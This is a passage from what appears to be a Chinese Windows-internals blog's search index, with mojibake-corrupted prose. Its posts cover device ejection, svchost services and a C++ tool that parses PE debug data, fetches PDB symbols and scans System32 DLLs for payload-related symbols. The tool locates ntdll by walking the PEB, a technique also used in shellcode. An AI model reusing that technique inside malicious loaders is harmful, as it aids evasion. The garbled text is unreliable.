CoTaskMemFree(pidl); &#125;&#125; æœ€ç»ˆè§£å†³æ–¹æ¡ˆ è°ƒç”¨ DeivceIOControl å¼ºåˆ¶å¼¹å‡ºï¼Œç„¶åé€šçŸ¥ç•Œé¢åˆ·æ–°ã€‚ ç•Œé¢åˆ·æ–°è°ƒç”¨äº† SendMessage å’Œ SHChangeNotifyï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š 123NotifyDeviceRemoval(dwVolLetter);SHChangeNotify(SHCNE_DRIVEREMOVED, SHCNF_PATH, wszVolShort, NULL);SHChangeNotify(SHCNE_DRIVEADD, SHCNF_PATH, wszVolShort, NULL); äº‹å®ä¸Šï¼Œåªè¦ CM_Request_Device_Eject_Ex è°ƒç”¨æˆåŠŸï¼Œé‚£å›¾æ ‡ç¼“å­˜å’Œè®¾å¤‡åˆ—è¡¨éƒ½ä¼šæ›´æ–°ï¼Œä½†æ˜¯è°ƒç”¨å¤±è´¥çš„æ—¶å€™å°±æ¯”è¾ƒå¤æ‚ï¼Œå°¤å…¶æ˜¯è¿”å› PNP_VetoIllegalDeviceRequest æ—¶ï¼Œæ²¡æœ‰åˆé€‚çš„æ–¹æ³•èƒ½ä»è®¾å¤‡åˆ—è¡¨ç§»é™¤è®¾å¤‡ã€‚ å¤‡å¿˜ 123456WCHAR wszDrivePoint[3] = L&quot; :&quot;;wszDrivePoint[0] = dwVolLetter;if (!DefineDosDevice(DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, wszDrivePoint, NULL)) MYTRACE(L&quot;DDD_REMOVE_DEFINITION bRet==%d&quot;, GetLastError());","tags":[{"name":"Windows/Win7","slug":"Windows-Win7","permalink":"https://hodlyounger.github.io/tags/Windows-Win7/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€æœåŠ¡ã€‘Windows æ›´æ–°åŒ»ç”ŸæœåŠ¡","date":"2024-08-12T07:05:26.949Z","path":"A_OS/Windows/æœåŠ¡/ã€æœåŠ¡ã€‘Windows æ›´æ–°åŒ»ç”ŸæœåŠ¡/","text":"æ¦‚è¿°ï¼šWindows æ›´æ–°åŒ»ç”ŸæœåŠ¡è¯´æ˜ ç›¸å…³é“¾æ¥ï¼š Windows Update Medic Service Process: Why Is It Running?","tags":[{"name":"æœåŠ¡","slug":"æœåŠ¡","permalink":"https://hodlyounger.github.io/tags/%E6%9C%8D%E5%8A%A1/"},{"name":"svchost","slug":"svchost","permalink":"https://hodlyounger.github.io/tags/svchost/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æœåŠ¡","slug":"A-OS/Windows/æœåŠ¡","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"ã€æœåŠ¡ã€‘svchost å¯åŠ¨å‘½ä»¤è¡Œæ•´ç†","date":"2024-08-12T06:47:37.273Z","path":"A_OS/Windows/æœåŠ¡/ã€æœåŠ¡ã€‘svchost å¯åŠ¨å‘½ä»¤è¡Œæ•´ç†/","text":"ğŸš§ æ¦‚è¿°ï¼šWindows Svchost å¯¹åº”çš„æœåŠ¡å’Œå¯åŠ¨å‘½ä»¤è¡Œæ•´ç† å¯åŠ¨å‘½ä»¤è¡Œ å¯¹åº”æœåŠ¡ svchost.exe -k wusvcs -p Windows æ›´æ–°åŒ»ç”ŸæœåŠ¡","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æœåŠ¡","slug":"A-OS/Windows/æœåŠ¡","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"ã€å¼‚å¸¸å¤„ç†ã€‘WPDé©±åŠ¨å¼‚å¸¸","date":"2024-08-12T06:14:43.094Z","path":"A_OS/Windows/å¼‚å¸¸åŠé”™è¯¯å¤„ç†/ã€å¼‚å¸¸å¤„ç†ã€‘WPDé©±åŠ¨å¼‚å¸¸/","text":"æ¦‚è¿°ï¼šæœ¬æ–‡è®°å½• WPD é©±åŠ¨åŠ è½½å¼‚å¸¸ï¼Œé”™è¯¯ä»£ç ï¼ˆ10ï¼‰å¦‚ä½•è§£å†³ æŠ¥é”™å¦‚ä¸‹æ‰€ç¤ºï¼šè¯¥è®¾å¤‡æ— æ³•å¯åŠ¨ã€‚ï¼ˆä»£ç  10ï¼‰ ç›¸å…³è§£å†³åŠæ³• å¦‚ä½•ä¿®å¤Windows 10/8/7ä¸Šçš„WPD FileSystem Volume Driveré—®é¢˜ - å…¶ä»– win7 64 USBé©±åŠ¨ï¼ˆæ”¯æŒZ390ã€H370ã€B360ã€H310ï¼‰ - article - åšå®¢å›­","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å¼‚å¸¸åŠé”™è¯¯å¤„ç†","slug":"A-OS/Windows/å¼‚å¸¸åŠé”™è¯¯å¤„ç†","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"}]},{"title":"ã€DbgHelpã€‘é€šè¿‡PDBåœ¨PEä¸­æŸ¥æ‰¾å‡½æ•°","date":"2024-08-11T16:00:00.000Z","path":"A_OS/Windows/DbgHelp/ã€DbgHelpã€‘é€šè¿‡PDBåœ¨PEä¸­æŸ¥æ‰¾å‡½æ•°/","text":"æ¦‚è¿°ï¼šå¦‚ä½•ä½¿ç”¨ PDB æŸ¥æ‰¾ PE ä¸­çš„ç‰¹å®šå‡½æ•°åçš„å‡½æ•° è¯´æ˜ å¦‚æœæŸ¥æ‰¾æŒ‡å®šPEä¸­æ˜¯å¦å£°æ˜å’Œä½¿ç”¨äº†æŸå‡½æ•°ï¼Œåˆ™éœ€è¦ä½¿ç”¨ Dbghelp.h æ ‡å¤´ - Win32 apps | Microsoft Learn æ¨¡å—ã€‚ å¦‚ä½•è·å– PDB æ–‡ä»¶ éœ€è¦è°ƒç”¨ symchk ä»å¾®è½¯ä¸‹è½½ï¼Œsymchk çš„è°ƒç”¨å‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š 12345symchk /r &lt;è·¯å¾„åˆ°PEæ–‡ä»¶&gt; /s SRV*&lt;æœ¬åœ°ç¬¦å·å­˜å‚¨è·¯å¾„&gt;*&lt;å¾®è½¯ç¬¦å·æœåŠ¡å™¨è·¯å¾„&gt; # ç¤ºä¾‹symchk /r C:\\Windows\\System32\\notepad.exe /s SRV*C:\\Symbols*http://msdl.microsoft.com/download/symbols åŠ è½½ PDB æ–‡ä»¶ åŠ è½½ PDB éœ€è¦è°ƒç”¨ SymLoadModuleExW åŠ è½½ æŸ¥æ‰¾ç¬¦å· æŸ¥æ‰¾ç¬¦å·å¯ä½¿ç”¨ SymFromNameW æˆ–è€… SymEnumSymbolsWï¼ŒåŒºåˆ«åœ¨äº SymEnumSymbolsW æ³¨å†Œçš„å›è°ƒå¯ä»¥çœ‹åˆ°æ˜¯æŸ¥æ‰¾çš„å‡½æ•°åè¯¦ç»†ä¿¡æ¯ã€‚ ä¸‹è½½åè·å–ç¬¦å·ä¸‹è½½è·¯å¾„ éœ€è¦è·å– PDB æ–‡ä»¶çš„ä¸‹è½½è·¯å¾„ï¼Œå¤§è‡´å½¢å¼å¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶ä¸­ acppage.pdb ä¸º PE æ–‡ä»¶ä¸­è·å–çš„ PDB æ–‡ä»¶åï¼ŒE07A9D2F9AE2077290F2627631E6C50C1 ä¸º PE æ–‡ä»¶ä¸­è·å–çš„ GUIDã€‚ 1d:\\symbols\\acppage.pdb\\E07A9D2F9AE2077290F2627631E6C50C1\\acppage.pdb PE è§£æç®€è¦è¯´æ˜ï¼Œç›¸å…³å‡½æ•°åä¸º GetPdbFileInfo ï¼š è¯»å– PE ä¸­çš„ IMAGE_DIRECTORY_ENTRY_DEBUG åŒº æ ¹æ®åç§»è·å– PIMAGE_DEBUG_DIRECTORY éå† IMAGE_DEBUG_DIRECTORYï¼ŒæŸ¥æ‰¾ Type ä¸º IMAGE_DEBUG_TYPE_CODEVIEW çš„ IMAGE_DEBUG_DIRECTORY æŸ¥çœ‹å½“å‰å—æ ‡å¿—ä½æ˜¯å¦ä¸º CV_SIGNATURE_RSDS(SDSR) ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™é€šè¿‡ PCV_INFO_PDB70 è§£æå½“å‰å†…å­˜å—ï¼Œè¯»å–ç­¾åå’Œ PDB æ–‡ä»¶å ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699// FindTheSqlMagicCode.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚//#include &lt;windows.h&gt;#include &lt;strsafe.h&gt;#include &lt;Dbghelp.h&gt;#include &lt;shlwapi.h&gt;#pragma comment(lib,&quot;Dbghelp.lib&quot;)#pragma comment(lib,&quot;shlwapi.lib&quot;)#define CV_SIGNATURE_NB10 &#x27;01BN&#x27;#define CV_SIGNATURE_RSDS &#x27;SDSR&#x27;#define RESET &quot;\\033[0m&quot;#define BLACK &quot;\\033[30m&quot; /* Black */#define RED &quot;\\033[31m&quot; /* Red */#define GREEN &quot;\\033[32m&quot; /* Green */#define YELLOW &quot;\\033[33m&quot; /* Yellow */#define BLUE &quot;\\033[34m&quot; /* Blue */#define MAGENTA &quot;\\033[35m&quot; /* Magenta */#define CYAN &quot;\\033[36m&quot; /* Cyan */#define WHITE &quot;\\033[37m&quot; /* White */#define BOLDGREEN &quot;\\033[1m\\033[32m&quot; /* Bold Green */#include &lt;vector&gt;#include &lt;set&gt;#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;// CodeView header typedef struct CV_HEADER &#123; DWORD CvSignature; // NBxx LONG Offset; // Always 0 for NB10&#125; * PCV_HEADER;// CodeView NB10 debug information // (used when debug information is stored in a PDB 2.00 file) typedef struct CV_INFO_PDB20 &#123; CV_HEADER Header; DWORD Signature; // seconds since 01.01.1970 DWORD Age; // an always-incrementing value BYTE PdbFileName[1]; // zero terminated string with the name of the PDB file &#125; * PCV_INFO_PDB20;// CodeView RSDS debug information // (used when debug information is stored in a PDB 7.00 file) typedef struct CV_INFO_PDB70 &#123; DWORD CvSignature; GUID Signature; // unique identifier DWORD Age; // an always-incrementing value BYTE PdbFileName[1]; // zero terminated string with the name of the PDB file &#125; * PCV_INFO_PDB70;LPBYTE GetRVAOffset(LPBYTE pBuffer, DWORD dwVirtualOffset) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; PIMAGE_NT_HEADERS32 pNtHeader32 = (PIMAGE_NT_HEADERS32)(pBuffer + pDosHeader-&gt;e_lfanew); PIMAGE_NT_HEADERS64 pNtHeader64 = (PIMAGE_NT_HEADERS64)(pBuffer + pDosHeader-&gt;e_lfanew); BOOL bIsX64 = pNtHeader32-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC; int nSectionNum = bIsX64 ? pNtHeader64-&gt;FileHeader.NumberOfSections : pNtHeader32-&gt;FileHeader.NumberOfSections; PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)(pBuffer + pDosHeader-&gt;e_lfanew + (bIsX64 ? sizeof(IMAGE_NT_HEADERS64) : sizeof(IMAGE_NT_HEADERS32))); // search for absolute offset for( int i = 0; i &lt; nSectionNum; i++) &#123; DWORD dwStart = pSection-&gt;VirtualAddress; if( dwStart &lt;= dwVirtualOffset &amp;&amp; dwVirtualOffset &lt; dwStart + pSection-&gt;SizeOfRawData)&#123; return pBuffer + pSection-&gt;PointerToRawData + (dwVirtualOffset - dwStart); &#125; pSection++; &#125; return 0; &#125; DWORD GetImageSize(LPBYTE pBuffer, BOOL&amp; bIsX64) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; PIMAGE_NT_HEADERS32 pNtHeader32 = (PIMAGE_NT_HEADERS32)(pBuffer + pDosHeader-&gt;e_lfanew); PIMAGE_NT_HEADERS64 pNtHeader64 = (PIMAGE_NT_HEADERS64)(pBuffer + pDosHeader-&gt;e_lfanew); bIsX64 = pNtHeader32-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC; DWORD SizeOfImage = bIsX64 ? pNtHeader64-&gt;OptionalHeader.SizeOfImage: pNtHeader32-&gt;OptionalHeader.SizeOfImage; return SizeOfImage; &#125; WCHAR* CharToWchar(CHAR* sSour)&#123; size_t len = strlen(sSour) + 1; size_t converted = 0; WCHAR *wzDest = NULL; wzDest = (WCHAR*)new WCHAR[len]; mbstowcs_s(&amp;converted, wzDest, len, sSour, _TRUNCATE); return wzDest;&#125;char* WCharToChar(WCHAR* wzSour)&#123; ULONG ulLength = 0; char* szDest = NULL; if (wzSour != NULL) &#123; ulLength = WideCharToMultiByte(CP_ACP,NULL, wzSour,-1,NULL,0,NULL,FALSE); szDest = new char[ulLength + 1]; if (szDest == NULL) &#123; return NULL; &#125; memset(szDest, 0, ulLength + 1); WideCharToMultiByte(CP_OEMCP, NULL, wzSour, -1, szDest, ulLength, NULL, FALSE); &#125; return szDest;&#125;BOOL GetPdbFileInfo(LPCWSTR lpszFilePath , LPWSTR szPdbFileName , DWORD dwPdbFileNameCch , LPWSTR szPdbGuid , DWORD dwPdbGuidCch , LPWSTR szChecksum , DWORD dwChecksumCch )&#123; DWORD dwTotalRead = 0, dwRead = 0; DWORD dwSize = 0; BOOL bFound = FALSE; HANDLE hFile = INVALID_HANDLE_VALUE; LPBYTE pBuffer = NULL; do &#123; // read the file into memory HANDLE hFile = ::CreateFileW( lpszFilePath , GENERIC_READ , FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE , NULL , OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL , NULL ); if( hFile == INVALID_HANDLE_VALUE ) &#123; break; &#125; dwSize = GetFileSize( hFile, NULL); if( dwSize &lt; 4096 ) // hardcode for file size limit &#123; break; &#125; pBuffer = (LPBYTE)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize); if(!pBuffer) &#123; break; &#125; while( dwTotalRead &lt; dwSize &amp;&amp; ReadFile( hFile, pBuffer + dwTotalRead, dwSize - dwTotalRead, &amp;dwRead, NULL) ) &#123; dwTotalRead += dwRead; &#125; &#125;while(0); if(hFile != INVALID_HANDLE_VALUE) &#123; ::CloseHandle(hFile); &#125; if(pBuffer == NULL) &#123; return FALSE; &#125; if(dwTotalRead != dwSize) &#123; if(pBuffer) &#123; HeapFree( GetProcessHeap(), 0, pBuffer); &#125; return FALSE; &#125; LPWSTR lpszpdbInfo = NULL; // locate the DEBUG section PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; if( pDosHeader-&gt;e_magic == IMAGE_DOS_SIGNATURE ) &#123; PIMAGE_DATA_DIRECTORY pDataDic; PIMAGE_NT_HEADERS32 pNtHeader32 = (PIMAGE_NT_HEADERS32)(pBuffer + pDosHeader-&gt;e_lfanew); PIMAGE_NT_HEADERS64 pNtHeader64 = (PIMAGE_NT_HEADERS64)(pBuffer + pDosHeader-&gt;e_lfanew); if( pNtHeader32-&gt;Signature == IMAGE_NT_SIGNATURE ) &#123; BOOL bIsX64 = pNtHeader32-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC; if( !bIsX64 ) pDataDic = &amp;pNtHeader32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG]; else pDataDic = &amp;pNtHeader64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG]; if( pDataDic &amp;&amp; pDataDic-&gt;Size &gt; 0 ) &#123; //The number of entries in the debug directory can be obtained by dividing the size of the debug directory (as specified in the optional headerâ€™s data directory entry) by the size of IMAGE_DEBUG_DIRECTORY structure. int nNumberOfEntries = pDataDic-&gt;Size / sizeof(IMAGE_DEBUG_DIRECTORY); PIMAGE_DEBUG_DIRECTORY pDebugDic = (PIMAGE_DEBUG_DIRECTORY)GetRVAOffset( pBuffer, pDataDic-&gt;VirtualAddress); for( int i = 0; i &lt; nNumberOfEntries &amp;&amp; !bFound ; i++) &#123; // CodeView debug information (stored in the executable) or Program Database debug information (stored in PDB file) if( pDebugDic-&gt;Type == IMAGE_DEBUG_TYPE_CODEVIEW ) &#123; LPBYTE pDebugData = pBuffer + pDebugDic-&gt;PointerToRawData; DWORD dwCVSignature = *(LPDWORD)pDebugData; if( dwCVSignature == CV_SIGNATURE_RSDS ) &#123; PCV_INFO_PDB70 pCvInfo = (PCV_INFO_PDB70)pDebugData; StringCbPrintfW( szPdbGuid, dwPdbFileNameCch , L&quot;%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X%d&quot; , pCvInfo-&gt;Signature.Data1 , pCvInfo-&gt;Signature.Data2 , pCvInfo-&gt;Signature.Data3 , pCvInfo-&gt;Signature.Data4[0] , pCvInfo-&gt;Signature.Data4[1] , pCvInfo-&gt;Signature.Data4[2] , pCvInfo-&gt;Signature.Data4[3] , pCvInfo-&gt;Signature.Data4[4] , pCvInfo-&gt;Signature.Data4[5] , pCvInfo-&gt;Signature.Data4[6] , pCvInfo-&gt;Signature.Data4[7] , pCvInfo-&gt;Age ); lpszpdbInfo = CharToWchar((LPSTR)pCvInfo-&gt;PdbFileName); StringCbCopy( szPdbFileName, dwPdbFileNameCch, lpszpdbInfo); delete[]lpszpdbInfo; if( bIsX64 ) &#123; StringCbPrintfW( szChecksum, dwChecksumCch , L&quot;%x%x&quot; , pNtHeader64-&gt;FileHeader.TimeDateStamp , pNtHeader64-&gt;OptionalHeader.SizeOfImage ); &#125; else &#123; StringCbPrintfW( szChecksum, dwChecksumCch , L&quot;%x%x&quot; , pNtHeader32-&gt;FileHeader.TimeDateStamp , pNtHeader32-&gt;OptionalHeader.SizeOfImage ); &#125; bFound = TRUE; &#125; &#125; pDebugDic++; &#125; &#125; &#125; &#125; HeapFree( GetProcessHeap(), 0, pBuffer); return bFound;&#125;DWORD RunTheSymchk(LPWSTR szCommandLine)&#123; DWORD dwMbrId = 0; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); BOOL bResult = ::CreateProcess(NULL,szCommandLine , NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi); if (!bResult) return 0; if (WaitForSingleObject(pi.hProcess,180*1000) == WAIT_TIMEOUT) return 0; int dwCode = 0; if (!GetExitCodeProcess(pi.hProcess,(DWORD*)&amp;dwCode)) &#123; return 0; &#125; CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 1;&#125;#define WINDBG_INSTALLPATH L&quot;D:\\\\Windows Kits\\\\10\\\\Debuggers\\\\x64&quot;#define NT_SYMBOLS_DIR L&quot;d:\\\\symbols\\\\&quot;#define NT_SYMBOLS_FORMATS L&quot;SRV*%ws*http://msdl.microsoft.com/download/symbols&quot;#define TEST_PATH L&quot;D:\\\\Documents\\\\D_IDA\\\\SHClient\\\\SHClient.exe&quot;#define SYMCHCKCMD_LINE_FORMATS L&quot;%ws\\\\symchk.exe /r %ws /s %ws&quot;#define LDR_IS_DATAFILE(handle) (((ULONG_PTR)(handle)) &amp; (ULONG_PTR)1)#define LDR_IS_IMAGEMAPPING(handle) (((ULONG_PTR)(handle)) &amp; (ULONG_PTR)2)#define LDR_IS_RESOURCE(handle) (LDR_IS_IMAGEMAPPING(handle) || LDR_IS_DATAFILE(handle))#if 0// #define SYMBOL_NAME L&quot;PsspDumpThread&quot;// #define SYMBOL_NAME L&quot;DownloadAndStagePayloads&quot;#define SYMBOL_NAME L&quot;*Payload*&quot;#define ENUM_PATH L&quot;D:\\\\Documents\\\\TestScanPath&quot;#define ENEABLE_DEEP_CALL 1#else#define SYMBOL_NAME L&quot;*Payload*&quot;#define ENUM_PATH L&quot;C:\\\\Windows\\\\System32&quot;#define ENEABLE_DEEP_CALL 1#endif// PSYM_ENUMERATESYMBOLS_CALLBACKW PsymEnumeratesymbolsCallback;void* GetNtdllBase()&#123;#if defined(_WIN64) ULONG64 peb = __readgsqword(0x60);#else ULONG64 peb = __readfsdword(0x30);#endif ULONG64 ldr = *(ULONG64*)(peb + 0x18); PLIST_ENTRY modlist = *(PLIST_ENTRY*)(ldr + 0x10); // ç¬¬äºŒä¸ªåŠ è½½çš„ dll å°±æ˜¯ ntdll return *(void**)((ULONG64)modlist-&gt;Flink + 0x30); // è·å–ç¬¬äºŒä¸ª listEntry ä¹‹åï¼Œå†è·å–&#125;vector&lt;std::pair&lt;wstring, wstring&gt;&gt; g_FindReslt;BOOL CALLBACK PsymEnumeratesymbolsCallback( _In_ PSYMBOL_INFOW pSymInfo, _In_ ULONG SymbolSize, _In_opt_ PVOID UserContext)&#123; wprintf(GREEN L&quot;%s-&gt;%s, Size:%d\\n&quot; WHITE, (WCHAR*)UserContext, pSymInfo-&gt;Name, SymbolSize); g_FindReslt.emplace_back(std::make_pair&lt;wstring, wstring&gt;((WCHAR*)UserContext, pSymInfo-&gt;Name)); return TRUE;&#125;int IsExeOrDll(const WCHAR* path)&#123; const WCHAR* patterns[] = &#123; L&quot;*.exe&quot;, L&quot;*.dll&quot;, NULL &#125;;#if 0 if (PathMatchSpecW(path, patterns[0]) == TRUE) return 1;#endif if (PathMatchSpecW(path, patterns[1]) == TRUE) return 2; return 0;&#125;int g_idx = 0;void FindAllDlls(const WCHAR* Path, int iDeep)&#123; if (iDeep &gt; 6) &#123; return; &#125; WCHAR TargetPath[MAX_PATH] = &#123;&#125;; WCHAR szTempPath[MAX_PATH] = &#123; 0 &#125;; LPCWSTR lpszFilePath = TEST_PATH; //ä»…æµ‹è¯•ç”¨ å¤§é‡å­—ç¬¦ä¸²ç”³è¯·ç”¨å †è€Œä¸æ˜¯æ ˆ DWORD dwLastError = 0; DWORD ModuleSize = 0; WCHAR szPdbFileName[MAX_PATH] = &#123; 0 &#125;; WCHAR szPdbGuid[MAX_PATH] = &#123; 0 &#125;; WCHAR szChecksum[MAX_PATH] = &#123; 0 &#125;; WCHAR szCommandLine[MAX_PATH] = &#123; 0 &#125;; WCHAR szNtSymbolUrl[MAX_PATH] = &#123; 0 &#125;; WCHAR szPdbSymbolPath[MAX_PATH] = &#123; 0 &#125;; LPSTR lpszPdbPath = NULL; WCHAR szSymbolName[MAX_SYM_NAME]; DWORD dwSizeOfSymbol = sizeof(SYMBOL_INFOW) + MAX_SYM_NAME * sizeof(WCHAR); PBYTE pBuffer = new BYTE[dwSizeOfSymbol]; PSYMBOL_INFOW pSymbol = (PSYMBOL_INFOW)pBuffer; HMODULE hModuleBase = NULL; PBYTE pModuleBase = NULL; PBYTE pSymAdr = NULL; PBYTE lpDestCall = NULL; LPWSTR lpszCFile = NULL; MEMORY_BASIC_INFORMATION MbInfo = &#123; 0 &#125;; BOOL bIsX64 = FALSE; StringCbCopy(TargetPath, MAX_PATH, Path); StringCbCat(TargetPath, MAX_PATH, L&quot;\\\\*.*&quot;); WIN32_FIND_DATA fd = &#123; 0 &#125;; HANDLE hFind = FindFirstFile(TargetPath, &amp;fd); do &#123; if (StrCmpCW(L&quot;AppVStreamingUX.exe&quot;, fd.cFileName) == 0) &#123; cout &lt;&lt; endl; &#125; if (StrCmpCW(L&quot;SIHClient.exe&quot;, fd.cFileName) == 0) &#123; cout &lt;&lt; endl; &#125; if (hFind != INVALID_HANDLE_VALUE) &#123; if (!(fd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)) &#123; int iFileExFlag = 0; const WCHAR* filename = fd.cFileName; if (!(iFileExFlag = IsExeOrDll(filename))) &#123; continue; &#125; szTempPath[0] = 0; StringCbCopy(szTempPath, MAX_PATH, Path); // szTempPath[wcslen(szTempPath)] = 0; PathAppend(szTempPath, fd.cFileName); lpszFilePath = szTempPath; GetPdbFileInfo(lpszFilePath, szPdbFileName, MAX_PATH, szPdbGuid, MAX_PATH, szChecksum, MAX_PATH); StringCbPrintf(szNtSymbolUrl, MAX_PATH * sizeof(WCHAR), NT_SYMBOLS_FORMATS, NT_SYMBOLS_DIR); StringCbPrintf(szCommandLine, MAX_PATH * sizeof(WCHAR), SYMCHCKCMD_LINE_FORMATS, WINDBG_INSTALLPATH, lpszFilePath, szNtSymbolUrl); StringCbCopy(szPdbSymbolPath, MAX_PATH * sizeof(WCHAR), NT_SYMBOLS_DIR); StringCbCat(szPdbSymbolPath, MAX_PATH * sizeof(WCHAR), szPdbFileName); StringCbCat(szPdbSymbolPath, MAX_PATH * sizeof(WCHAR), L&quot;\\\\&quot;); StringCbCat(szPdbSymbolPath, MAX_PATH * sizeof(WCHAR), szPdbGuid); StringCbCat(szPdbSymbolPath, MAX_PATH * sizeof(WCHAR), L&quot;\\\\&quot;); StringCbCat(szPdbSymbolPath, MAX_PATH * sizeof(WCHAR), szPdbFileName); // if (iFileExFlag == 1) &#123; std::cout &lt;&lt; (iFileExFlag == 1 ? MAGENTA : CYAN); wprintf(L&quot;%d Load:%ws\\r\\n&quot;, g_idx++, lpszFilePath); std::cout &lt;&lt; WHITE; &#125; hModuleBase = LoadLibraryExW(lpszFilePath, NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE); pModuleBase = (PBYTE)hModuleBase; BOOL bNeedUnload = TRUE; if (GetModuleHandle(filename)) &#123; bNeedUnload = FALSE; &#125; if (LDR_IS_RESOURCE(hModuleBase)) &#123; ULONG_PTR ulTemp = (ULONG_PTR)hModuleBase; ulTemp = ulTemp - 2; pModuleBase = (PBYTE)ulTemp; &#125; if (pModuleBase == NULL) &#123; continue; &#125; ModuleSize = GetImageSize((LPBYTE)pModuleBase, bIsX64);#if 0 if (!bIsX64) &#123; FreeLibrary(hModuleBase); continue; &#125;#endif if (!PathFileExists(szPdbSymbolPath)) &#123; // RunTheSymchk(szCommandLine); &#125; DWORD64 baseAddr = 0; lpszPdbPath = WCharToChar(szPdbSymbolPath); // if (!SymLoadModule64(GetCurrentProcess(), NULL, (STRSAFE_LPCSTR)lpszPdbPath, NULL, (DWORD64)pModuleBase, ModuleSize)) if (!(baseAddr = SymLoadModuleExW(GetCurrentProcess(), NULL, (PCWSTR)szPdbSymbolPath, NULL, (DWORD64)pModuleBase, ModuleSize, NULL, 0))) &#123; dwLastError = GetLastError(); delete[] lpszPdbPath; FreeLibrary(hModuleBase); SymUnloadModule(GetCurrentProcess(), (DWORD64)pModuleBase); continue; &#125; delete[] lpszPdbPath; pSymbol-&gt;SizeOfStruct = sizeof(SYMBOL_INFO);; pSymbol-&gt;MaxNameLen = MAX_SYM_NAME; if (!SymFromNameW(GetCurrentProcess(), SYMBOL_NAME, pSymbol)) &#123; dwLastError = GetLastError(); FreeLibrary(hModuleBase); continue; &#125; if (!SymEnumSymbolsW(GetCurrentProcess(), baseAddr, SYMBOL_NAME, PsymEnumeratesymbolsCallback, (PVOID)lpszFilePath)) &#123; dwLastError = GetLastError(); FreeLibrary(hModuleBase); continue; &#125; // g_FindReslt.emplace_back(lpszFilePath); // wprintf(MAGENTA L&quot;FileX64:%ws\\r\\n&quot; WHITE, lpszFilePath);#if 0 pSymAdr = (PBYTE)pSymbol-&gt;Address; if (VirtualQuery(pSymAdr, &amp;MbInfo, sizeof(MbInfo)) == sizeof(MbInfo)) &#123; if (MbInfo.State != MEM_COMMIT) &#123; dwLastError = GetLastError(); 